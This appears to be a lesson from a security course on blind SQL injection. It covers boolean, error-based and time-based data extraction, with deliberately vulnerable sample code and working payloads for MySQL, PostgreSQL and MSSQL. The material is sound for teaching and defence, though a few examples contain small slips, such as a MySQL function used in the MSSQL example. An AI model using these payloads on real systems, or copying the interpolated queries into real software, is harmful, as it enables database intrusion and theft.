# SQL INJECTION - LESSON 02

## 'BLIND SQL INJECTION
What means blind?

Blind SQL injection is an SQL injection attack technique that extract information
 from the database without the use of verbose database error messages or in-band
 data concatenation.

Common scenarios:

1. A generic error page is returned (no specific sql errors are visible) and we can control the output in some way (not directly injecting values).
2. A generic error page is returned (no specific sql errors are visible) but we can't control the output.
Appear when multiple SQL query are executed but only the first is vulnerable and does not produce output.
3. No error page or control of the output.

## BOOLEAN BASED INJECTION

Boolean based injection can be used when we can't directly control the response
outputting custom values (like we did with UNION BASED), but we can still
observe some changes on the response.
The main idea on boolean based injections is to inject a conditional branch in
the SQL statement and observe the response that will have a particular signature
if the condition is `TRUE` or `FALSE`.

Given this Node.js code:
```js
connection.query("SELECT COUNT(id) FROM pages WHERE status = '" + req.body.status + "'",
  function(error, result) {
    if (error) {
      console.log("Generic error");
      // console.log(error); // comment this to improve security :D
    } else {
      console.log("There are " + result + "pages.");
    }
  }
);
```
N.B. the comment is sarcastic. It is a bad security practice if you are
protecting your app from SQL injections simply hiding the SQL errors.

Using `status = "'";`, an error will be produced and we will get as response
`Generic error`. We use this to identify a vulnerable parameter.
Unfortunately we can't use the UNION BASED technique here because the response
will be the number of pages that satisfy the WHERE clause.
But we can observe the output for known values and infer information.

If we use `status = "published";`, the default behaviour of our vulnerable app,
the query will be valid and the response will be `There are 15 pages`.
But if we append a WHERE clause always false we can be sure that the output
will be always `There are 0 pages`.

Using `status = "published' AND 1=0 -- -";` the query produced will be:

```sql
SELECT COUNT(id) FROM pages WHERE status = 'published' AND 1=0 -- -' # Always FALSE
```

To exploit a BOOLEAN BASED injection, instead of inserting an always false clause,
we can insert an arbitrary clause that allow us to infer information.

Using `status = "published' AND SUBSTRING(database(), 1, 1) = 'a' -- -";` the query produced will be:

```sql
SELECT COUNT(id) FROM pages
WHERE status = 'published' AND SUBSTRING(database(), 1, 1) = 'a' -- -' # True if database first letter is 'a'
```

Assuming that our database name is 'web'.
```sql
SELECT COUNT(id) FROM pages
WHERE status = 'published' AND SUBSTRING(database(), 1, 1) = 'a' -- -' # False

SELECT COUNT(id) FROM pages
WHERE status = 'published' AND SUBSTRING(database(), 1, 1) = 'b' -- -' # False

...

SELECT COUNT(id) FROM pages
WHERE status = 'published' AND SUBSTRING(database(), 1, 1) = 'w' -- -' # True
```

We can infer the `True`/`False` output from the response that will return
`There are 15 pages` for `True` and `There are 0 pages.` for `False`.

### GET ALL CHARACTERS

We move then on the next characters to obtain the full string:
```sql
SELECT COUNT(id) FROM pages
WHERE status = 'published' AND SUBSTRING(database(), 1, 1) = 'w' -- -' # True

SELECT COUNT(id) FROM pages
WHERE status = 'published' AND SUBSTRING(database(), 2, 1) = 'e' -- -' # True

SELECT COUNT(id) FROM pages
WHERE status = 'published' AND SUBSTRING(database(), 3, 1) = 'b' -- -' # True
```

### GET THE END OF THE STRING

In this way we can't know when a string is finished because `SUBSTRING` will
simply return an empty string if you ask it to provide an out of bound index.
We can take advantage of the `LENGTH` operator in MySQL:

Using `status = "published' AND LENGTH(database()) = 1 -- -";` the query produced will be:

```sql
SELECT COUNT(id) FROM pages
WHERE status = 'published' AND LENGTH(database()) = 1 -- - # False

SELECT COUNT(id) FROM pages
WHERE status = 'published' AND LENGTH(database()) = 2 -- - # False

SELECT COUNT(id) FROM pages
WHERE status = 'published' AND LENGTH(database()) = 3 -- - # True
```

### SPEED UP

We the precedent technique we have to brute-force all chars and this is pretty
inefficient.
Because a byte can have one of 256 values, we can use the binary search to
infer the value of single bytes using just 8 requests:

Assuming out value is 119:

1. Is the byte greater than 127? No, because 119 < 127.
2. Is the byte greater than 63? Yes, because 119 > 63.
3. Is the byte greater than 95? Yes, because 119 > 95.
4. Is the byte greater than 111? Yes, because 119 > 111.
5. Is the byte greater than 119? No, because 119 = 119.
6. Is the byte greater than 115? Yes, because 119 > 115.
7. Is the byte greater than 117? Yes, because 119 > 117.
8. Is the byte greater than 118? Yes, because 119 > 118.

```sql
SELECT COUNT(id) FROM pages
WHERE status = 'published' AND ASCII(SUBSTRING(database(), 1, 1)) > 127 -- -' # False

SELECT COUNT(id) FROM pages
WHERE status = 'published' AND ASCII(SUBSTRING(database(), 1, 1)) > 63 -- -' # True

...

SELECT COUNT(id) FROM pages
WHERE status = 'published' AND ASCII(SUBSTRING(database(), 1, 1)) > 118 -- -' # True
```
The disadvantage of this approach is that we must run the queries subsequently,
because we need the response of the previous query to make the next one.
To speed up the process we can use the 'bit-by-bit' approach that can make 8
requests in parallel without waiting the previous request (we will explore it
  in the next lessons).

## 'BLIND ERROR BASED INJECTION

Blind Error based injections come into play when we observe that an application show
us a generic error message when we break the syntax of a query and we have no
control on the output of a legal query.
The main idea behind this approach is to alter the query in order to inject a
statement that will get executed when an arbitrary condition is true (like we
did for `BOOLEAN BASED`) and, at the same time, this statement should
produce a database error.
In this way we can use the error as a feedback for our condition.

### CONDITIONAL EXPRESSION IN PostgreSQL and MSSQL
```sql
SELECT
  CASE
    WHEN 127 > 2 THEN 'YES'
    ELSE 'NO'
  END
```
In this SQL code the first expression (`127 > 2`) will be evaluated and, if true
the select statement will return `YES`, otherwise `NO`.

### CONDITIONAL EXPRESSION IN MySQL
```sql
SELECT
  IF (
    127 > 2,
    'YES',
    'NO'
  )
```
In this SQL code the first expression (`127 > 2`) will be evaluated and, if true
the select statement will return `YES`, otherwise `NO`.

### BLIND ERROR BASED EXAMPLE

Given this ruby code in a PostgreSQL environment:
```ruby
require 'pg'
conn = PG.connect(:dbname => 'web', :user => 'user', :password => 'password')
begin
  res  = conn.exec("SELECT COUNT(id) FROM pages WHERE status = '#{params[:status]}'")
  puts "Query executed"
rescue PG::Error => err
  puts "Generic error"
end
```
N.B. This is bad. If your are using Ruby or Rails use ActiveRecord and do not
interpolate strings in queries.

Our goal is to inject a conditional statement (`CASE`) in the original query
and infer some info with the binary search as we did in the previous chapter.
We will recognize a true condition when we will get an error from the application,
therefore we have to inject a legal statement (with a legal syntax) that
produces an error.
In PostgreSQL `1/0` is a legal statement that produce a `Division by zero` error.
The same statement is legal for MSSQL and produce a similar error.
For MySQL we can use a subquery that returns multiple rows in a comparison:
`SELECT * FROM news WHERE id = (SELECT table_name FROM information_schema.columns)`

So we have to inject:
```sql
SELECT
  CASE
    WHEN (SUBSTRING(current_database(), 1, 1) = 'a')
    THEN (1/0)
    ELSE 1
  END
```
to check if the first letter of `current_database()` is `a`.
To add this query to the vulnerable one we can use our friend `UNION`, so our
payload will be:

```
status = ' UNION ALL SELECT CASE WHEN (SUBSTRING(current_database(), 1, 2) = 'a') THEN (1/0) ELSE 1 END; --
```

And the query produced will be:
```sql
SELECT COUNT(id) FROM pages WHERE status = ''
UNION ALL
SELECT
  CASE
    WHEN (SUBSTRING(current_database(), 1, 1) = 'a')
    THEN (1/0)
    ELSE 1
  END
```
If the `current_database()` first letter is `a` the `1/0` will be executed
triggering an error, otherwise the query will not trigger an error.
As seen before we can use binary search or 'bit-to-bit' to obtain each byte
in 8 requests.

```
status = ' UNION ALL SELECT CASE WHEN (ASCII(SUBSTRING(current_database(), 1, 2)) > 127) THEN (1/0) ELSE 1 END; --
```

And the query produced will be:
```sql
SELECT COUNT(id) FROM pages WHERE status = ''
UNION ALL
SELECT
  CASE
    WHEN (ASCII(SUBSTRING(current_database(), 1, 2)) > 127)
    THEN (1/0)
    ELSE 1
  END
```


## 'TIME BASED INJECTION

Time based injections are useful when we have absolutely no control on the
response and we can't rely on `BOOLEAN BASED` or `ERROR BASED`.
The main idea behind this technique is to introduce a delay in the query
execution if some condition in the query is satisfied.
Measuring the time of the response will allow us to know if a condition is true
or false.
We will use the binary search or 'bit-to-bit' technique to infer what we want.


### DELAY IN MySQL

`SLEEP()` is a function that will pause the query for a fixed number of seconds.
`SLEEP(99.125)` will pause the query for `99.125` seconds.

`BENCHMARK(N, expression)` is a function that will execute `expression` for `N`
times.
`BENCHMARK(1000000, RAND())` will execute the `RAND()` statement for `1000000`
times. Expression are executed really quickly so we have to use big numbers
(obviously it depends by the `expression` used).

The main difference between `SLEEP` and `BENCHMARK` is that `SLEEP` introduce a
delay fixed and that we can control, whereas we don't know the delay introduced
by `BENCHMARK` that depends by the chosen expression and the server load.

### TIME BASED INJECTION EXAMPLE (MySQL)
Given this python code:
```python
def count_pages(status):
  with connection.cursor() as cursor:
    cursor.execute("""SELECT COUNT(id) FROM pages WHERE status = '%s'""" % status)
    result = cursor.fetchone()
    update_pages_count(result[0]) # This function does not produce output
    return 'ok'
);
```
N.B. This is an intended bad example. Do not interpolate strings in a SQL query.

Using `status = "' UNION SELECT IF (ASCII(SUBSTRING(database(), 1, 1)) > 127, SLEEP(1), 1) -- -"` the query produced will be:

```sql
SELECT COUNT(id) FROM pages
WHERE status = ''
UNION SELECT IF (
  ASCII(SUBSTRING(database(), 1, 1)) > 127,
  SLEEP(5),
  1
) -- -'
```
If the first char of `database()` (`SUBSTRING(database(), 1, 1)`), converted to
ASCII (`ASCII(...)`) is greater that `127` the query will pause for 5 seconds
(`SLEEP(5)`) or it will return immediately `1`.

We can do the same thing with `BENCHMARK()`:

Using `status = "' UNION SELECT IF (ASCII(SUBSTRING(database(), 1, 1)) > 127, BENCHMARK(1000000, RAND()), 1) -- -"` the query produced will be:

```sql
SELECT COUNT(id) FROM pages
WHERE status = ''
UNION SELECT IF (
  ASCII(SUBSTRING(database(), 1, 1)) > 127,
  BENCHMARK(1000000, RAND()),
  1
) -- -'
```

If the first char of `database()` (`SUBSTRING(database(), 1, 1)`), converted to
ASCII (`ASCII(...)`) is greater that `127` the query will execute `RAND()` for
`1000000` times (`BENCHMARK(1000000, RAND())`) introducing a noticeable delay or
 it will return immediately `1`.

### DELAY IN MSSQL

`WAITFOR()` is the Microsoft SQL function to pause the execution of a query.
`WAITFOR 15:00` will halt the execution until `15:00`.
Using the keyword `DELAY` we can specify a relative time:
`WAITFOR DELAY '00:00:05'` will halt the query execution for `5` seconds.
The main difference between `WAITFOR` and `SLEEP` or `BENCHMARK` is that we can't
use it in a subquery but we have to introduce it in the main query.
`MSSQL` also allow us to use stacked queries: we can take advantage of them and
introduce a new stacked query with our delay.

### TIME BASED INJECTION EXAMPLE (MSSQL)
Given this python code:
```python
def count_pages(status):
  with connection.cursor() as cursor:
    cursor.execute("""SELECT COUNT(id) FROM pages WHERE status = '%s'""" % status)
    result = cursor.fetchone()
    update_pages_count(result[0]) # This function does not produce output
    return 'ok'
);
```
N.B. This is an intended bad example. Do not interpolate strings in a SQL query.

Using `status = "published'; IF (ASCII(SUBSTRING(database(), 1, 1)) > 127)) WAITFOR DELAY '00:00:05' -- -";` the query produced will be:

```sql
SELECT COUNT(id) FROM pages WHERE status = 'published';
IF (ASCII(SUBSTRING(database(), 1, 1)) > 127)) WAITFOR DELAY '00:00:05' -- -";
```

The first query will be executed normally. In the second query, if the first
char of `database()` (`SUBSTRING(database(), 1, 1)`), converted to ASCII (`ASCII(...)`)
is greater that `127` the query will pause for 5 seconds
(`WAITFOR DELAY '00:00:05'`).

### EXTRA

In the real world the query execution time can depend of a lot of factors.
For example, if we introduce a delay of 1 second, but we have a weak WiFi signal
how can we know if the delay was introduced by SQL or WiFi?

Solutions:
1. Set a time long enough to exclude influence from other factors. Pay attention
that values too high can generate timeout exceptions.
2. Send two queries with inverted condition, at the same time: the first that
returns will likely not introduce delay.
